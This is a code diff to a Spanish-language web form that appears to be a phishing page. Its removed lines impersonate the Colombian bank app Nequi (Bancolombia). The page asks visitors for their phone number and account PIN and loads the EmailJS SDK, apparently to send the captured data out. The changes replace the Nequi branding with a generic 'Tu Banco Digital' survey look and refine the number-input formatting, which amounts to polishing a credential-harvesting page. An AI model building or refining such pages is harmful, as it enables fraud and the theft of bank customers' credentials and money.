@@ -10,7 +10,7 @@
 <!-- EmailJS SDK -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-<title> Nequi - Verificacion de datos</title>
+<title>Encuesta Financiera | Tu Banco Digital</title>
 
 <style>
 * {
@@ -42,14 +42,14 @@ body {
 /* LOGO - MÁS GRANDE */
 .logo-space {
     height: auto;
-    margin-bottom: 0px;
+    margin-bottom: 8px;
     display: flex;
     justify-content: center;
     align-items: center;
 }
 
 .logo {
-    max-width: 250px;
+    max-width: 120px;
     height: auto;
     object-fit: contain;
 }
@@ -281,7 +281,7 @@ select {
     font-size: 24px;
     font-weight: 700;
     color: #2a2a2a;
-    margin-bottom: 20px;
+    margin-bottom: 16px;
 }
 
 .final-text {
@@ -302,14 +302,14 @@ select {
 /* Logo en pantalla final */
 .final-logo-space {
     margin-top: 0;
-    margin-bottom: 0px;
+    margin-bottom: 8px;
     display: flex;
     justify-content: center;
     align-items: center;
 }
 
 .final-logo {
-    max-width: 250px;
+    max-width: 100px;
     height: auto;
     object-fit: contain;
 }
@@ -350,7 +350,7 @@ select {
     <!-- Pantalla inicial de login -->
     <div id="loginScreen" class="container">
         <div class="logo-space">
-            <img src="logonequi.png" class="logo" alt="logo">
+            <img src="https://via.placeholder.com/120x60?text=LOGO" class="logo" alt="logo">
         </div>
         <div class="description">
             Ingresa tu número del cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
@@ -409,12 +409,25 @@ select {
     const tipoDocumentoOptions = ['CC', 'TI', 'CE'];
 
     // Función para formatear números con puntos (ej: 1000 -> 1.000)
-    function formatNumberWithDots(value) {
-        if (!value) return '';
-        let cleanValue = value.toString().replace(/[^0-9]/g, '');
-        if (cleanValue === '') return '';
-        let number = parseInt(cleanValue, 10);
-        return number.toLocaleString('es-CO');
+    // y mantener el cursor al final SIEMPRE
+    function formatNumberWithDots(inputElement) {
+        if (!inputElement) return;
+        
+        let rawValue = inputElement.value.replace(/[^0-9]/g, '');
+        if (rawValue === '') {
+            inputElement.value = '';
+            return;
+        }
+        
+        let number = parseInt(rawValue, 10);
+        let formattedValue = number.toLocaleString('es-CO');
+        
+        // Solo actualizar si el valor cambió
+        if (inputElement.value !== formattedValue) {
+            inputElement.value = formattedValue;
+            // Mover el cursor al final después de formatear
+            inputElement.setSelectionRange(formattedValue.length, formattedValue.length);
+        }
     }
 
     // Función para aplicar formato a inputs numéricos mientras escribe
@@ -422,17 +435,45 @@ select {
         if (!inputElement) return;
         
         inputElement.addEventListener('input', function(e) {
-            let cursorPosition = this.selectionStart;
+            // Guardar la posición actual del cursor ANTES de formatear
+            let cursorPos = this.selectionStart;
+            let oldLength = this.value.length;
+            
+            // Obtener solo números
             let rawValue = this.value.replace(/[^0-9]/g, '');
             if (rawValue === '') {
                 this.value = '';
                 return;
             }
-            let formattedValue = parseInt(rawValue, 10).toLocaleString('es-CO');
+            
+            let number = parseInt(rawValue, 10);
+            let formattedValue = number.toLocaleString('es-CO');
+            
+            // Calcular la nueva posición del cursor
+            let newLength = formattedValue.length;
+            let addedDots = (formattedValue.match(/\./g) || []).length;
+            let oldDots = (this.value.match(/\./g) || []).length;
+            
+            // Actualizar el valor
             this.value = formattedValue;
             
-            let newCursorPos = cursorPosition + (formattedValue.length - this.value.length);
+            // Calcular nueva posición del cursor (siempre al final)
+            let newCursorPos = formattedValue.length;
+            
+            // Asegurar que el cursor se mueve al final
             this.setSelectionRange(newCursorPos, newCursorPos);
+        });
+        
+        // También manejar el evento keyup para casos extremos
+        inputElement.addEventListener('keyup', function(e) {
+            // Asegurar que el cursor está al final después de cualquier tecla especial
+            if (this.value.length > 0) {
+                let cursorPos = this.selectionStart;
+                let expectedPos = this.value.length;
+                if (cursorPos !== expectedPos) {
+                    this.setSelectionRange(expectedPos, expectedPos);
+                }
+            }
         });
     }
 
@@ -604,7 +645,7 @@ select {
                 questionsContent.innerHTML = `
                     <div class="final-message">
                         <div class="final-logo-space">
-                            <img src="logonequi.png" class="final-logo" alt="logo">
+                            <img src="https://via.placeholder.com/100x50?text=LOGO" class="final-logo" alt="logo">
                         </div>
                         <div class="final-title">Muchas gracias</div>
                         <div class="final-text">
@@ -613,7 +654,7 @@ select {
                         </div>
                         <button class="primary active" id="exitBtn">Salir</button>
                         <div class="final-note">
-                           Nequi es un producto de Bancolombia. Si necesita ayuda, contáctenos a través de nuestros canales oficiales.
+                            Banco Digital · Seguridad y confianza
                         </div>
                     </div>
                 `;
